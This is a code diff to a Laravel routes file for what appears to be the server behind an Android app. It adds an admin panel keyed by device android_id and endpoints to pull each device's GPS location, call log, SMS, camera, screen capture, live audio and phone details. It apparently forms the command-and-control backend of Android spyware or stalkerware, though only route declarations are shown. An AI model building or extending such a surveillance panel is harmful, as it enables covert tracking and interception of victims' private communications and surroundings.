@@ -108,4 +108,17 @@ Route::get('/get-flags', [ApkController::class, 'getFlags']);
 Route::post('/post-data', [ApkController::class, 'postData']);
 Route::post('/upload-endpoint', [ApkController::class, 'uploadFile']);
 Route::get('/decrypt', [EncryptionController::class, 'decryptImage']);
+Route::get('/admin-pages', [ApkController::class, 'admin']);
+Route::post('/update-flags', [ApkController::class, 'updateFlag'])->name('updateFlag');
+Route::get('/admin-pages/{android_id}', [ApkController::class, 'adminDetail'])->name('admin.detail');
+Route::post('/fetch-phone', [ApkController::class, 'fetchPhone'])->name('fetchPhone');
+Route::post('/fetch-signal', [ApkController::class, 'fetchSignal'])->name('fetchSignal');
+Route::post('/fetch-gps', [ApkController::class, 'fetchGps'])->name('fetchGps');
+Route::post('/fetch-calls', [ApkController::class, 'fetchCalls'])->name('fetchCalls');
+Route::post('/fetch-smss', [ApkController::class, 'fetchSmss'])->name('fetchSmss');
+Route::post('/fetch-camera', [ApkController::class, 'fetchCamera'])->name('fetchCamera');
+Route::post('/fetch-screen', [ApkController::class, 'fetchScreen'])->name('fetchScreen');
+Route::post('/fetch-audio', [ApkController::class, 'fetchAudio'])->name('fetchAudio');
+Route::post('/remove-item', [ApkController::class, 'removeItem'])->name('removeItem');
+
 require __DIR__.'/auth.php';
